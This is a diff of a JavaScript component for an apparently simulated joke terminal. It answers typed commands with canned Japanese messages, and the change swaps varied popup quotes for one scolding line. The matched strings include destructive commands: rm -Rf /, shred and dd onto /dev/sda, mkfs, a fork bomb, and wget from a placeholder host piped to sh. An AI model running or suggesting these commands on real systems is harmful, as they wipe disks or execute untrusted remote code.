@@ -33,34 +33,34 @@
       // 受け取ったメッセージに対応する文字列を返す
       switch (this.message) {
         case 'rm -Rf /':
-        this.$root.popupText = "夏といえば、スイカと花火と女だろ";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
           return 'システム上のすべてのファイルとディレクトリを強制的に削除しました。';
         case 'shred /dev/sda':
-        this.$root.popupText = "そのスペック全然フツーじゃないでしょ";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
           return 'ディスクドライブ（/dev/sda）の全てのデータを削除しました。';
         case 'dd if=/dev/random of=/dev/sda':
         this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
           return '/dev/random からランダムなデータを /dev/sda ディスクに書き込みました。';
         case 'mkfs.ext4 /dev/sda1':
-        this.$root.popupText = "いちばんいけないのはおなかが空いていることと、一人でいることだから";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return 'ディスクドライブ（/dev/sda1）にExt4ファイルシステムを作成しました。';
         case 'mv / /dev/null':
-        this.$root.popupText = "何を始めようってのー？";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return 'システムのルートディレクトリ（/）を/dev/null（ヌルデバイス）に移動することを試みました。';
         case ':(){:|:&};:':
-        this.$root.popupText = "止めて...涙を。ここ、握って止めて";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return 'システムに膨大なプロセスを作成し続ける無限ループを起こしました。';
         case 'wget http://unknownsource.com/possiblydangerous.sh -O- | sh':
-        this.$root.popupText = "ゲームじゃない、スポーツ";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return '不明なソースからスクリプトをダウンロードして実行しました。';
         case 'gunzip untrusted.gz':
-        this.$root.popupText = "こいこい！";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return 'untrusted.gzという不明なファイルを解凍しました。';
         case 'command > file.conf':
-        this.$root.popupText = "遊びだって！？人間を殺すことが遊びだって！？";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return 'コマンドの出力をfile.confというファイルに上書きしました。';
         case '^mistake^correction':
-        this.$root.popupText = "まあ、まずは落ち着きなさい。人間、落ち着きが肝心だよ。";
+        this.$root.popupText = "ネットの中だからって、何でもやっていいと思ったら、大間違いだ！";
             return '"mistake"を"correction"に置換してコマンドを実行しました。';
         default:
         this.$root.popupText = "お前、何者だ？";
